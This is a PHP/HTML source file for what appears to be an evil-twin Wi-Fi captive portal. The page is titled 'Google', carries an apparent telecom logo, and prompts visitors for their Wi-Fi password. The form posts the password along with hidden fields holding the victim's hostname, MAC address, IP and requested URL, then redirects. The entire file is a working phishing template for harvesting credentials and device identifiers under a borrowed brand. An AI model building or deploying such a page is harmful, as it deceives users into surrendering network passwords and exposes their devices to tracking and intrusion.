<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8">
    <title>Google</title>
    <link href='assets/css/bootstrap.min.css' rel="stylesheet">
    <link href='assets/css/progress-bar.css' rel="stylesheet">
    <link href='assets/css/custom.css' rel="stylesheet">
    <link rel="icon" type="image/png" href="assets/images/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #00A8E0;
        }
        .container {
            max-width: 400px;
            margin: 100px auto;
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        #logo {
            text-align: center;
            margin-bottom: 20px;
        }
        h1, h2 {
            text-align: center;
            margin: 10px 0;
        }
        h1 {
            font-size: 24px;
            color: #333;
        }
        h2 {
            font-size: 16px;
            color: #555;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #00A8E0;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #007B9E;
        }
    </style>
</head>
<body>
    <div class="container">
      <div id="logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -42 1000 411">
        <path fill="#000000" d="M925 246c-2 0-4-2-4-5V109h-45c-3 0-5-2-5-5V86c0-3 2-5 5-5h120c2 0 4 2 4 5v18c0 3-2 5-4 5h-45v132c0 3-2 5-5 5h-21m-344-66-24-68-24 68h48zm52 60c1 3-1 6-4 6h-21c-3 0-5-2-6-5l-12-35h-66l-13 35c-1 3-2 5-6 5h-20c-2 0-4-3-3-6l56-155c1-2 2-4 6-4h27c3 0 5 2 6 4l56 155m160-16c13 0 22-7 29-18l-34-35c-12 7-20 14-20 28s11 25 25 25m9-121c-11 0-17 7-17 16 0 7 4 13 12 22 15-8 21-13 21-22s-5-16-16-16m91 137c3 3 1 6-2 6h-26c-4 0-6-1-8-4l-16-17a57 57 0 0 1-49 24c-30 0-54-18-54-49 0-24 13-36 32-47-9-11-13-22-13-32 0-26 17-43 44-43 28 0 45 16 45 40 0 20-15 32-31 41l23 24 13-22c2-3 4-4 7-4h20c3 0 5 2 3 6l-23 39 35 38m-205 6c2 0 4-2 4-5V109h45c3 0 5-2 5-5V86c0-3-2-5-5-5H617c-2 0-4 2-4 5v18c0 3 2 5 4 5h45v132c0 3 2 5 5 5h21z"/>
        <path fill="#00A8E0" d="M79 326a205 205 0 0 0 262-8s0-1 0 0c-16 10-63 34-135 34a257 257 0 0 1-127-26m140 10c51 0 107-14 140-41 9-7 18-17 25-31a197 197 0 0 0 12-25c-30 45-120 73-213 73-65 0-135-20-163-60 0-1 0-1 0 0 26 54 103 84 199 84m-55-90C59 246 9 197 0 163c0 12 1 26 3 36 1 4 5 12 10 18 26 26 89 63 199 63 150 0 185-49 192-66a151 151 0 0 0 6-62c-7 40-135 94-246 94M20 75c-6 12-13 32-15 43-1 4 0 6 1 10 13 26 77 69 225 69 91 0 162-22 173-63 2-7 2-15 0-26a200 200 0 0 0-14-35c2 53-147 88-222 88-82 0-150-33-150-74l2-12m321-65 2 4c0 23-70 64-182 64-81 0-97-31-97-50 0-7 3-14 9-21 0-1 0-1 0 0-11 9-21 19-29 30-4 5-7 9-7 12 0 40 100 69 194 69 100 0 144-33 144-61 0-10-4-16-14-28L342 9l-1 1m-30-23a203 203 0 0 0-212 1C90-7 84-2 84 4c0 17 41 36 113 36 71 0 126-21 126-40 0-5-4-8-12-13"/>
      </svg>
      </div>
        <h1>Sign in</h1>
        <h2>Input your Wifi password to continue</h2>
        <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
            <input name="email" type="hidden" value="adresse_email@exemple.com" required>
            <input name="password" id='password-input' type="password" placeholder="Password" required>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
            <button type="submit">Next</button>
        </form>
    </div>
    <script src='assets/js/jquery-3.4.1.min.js'></script>
    <script src='assets/js/bootstrap.min.js'></script>
    <script type="text/javascript">
        function redirect() {
            setTimeout(function() {
              window.location.href = "/captiveportal/index.php";
            }, 100);
        }
    </script>
</body>
</html>
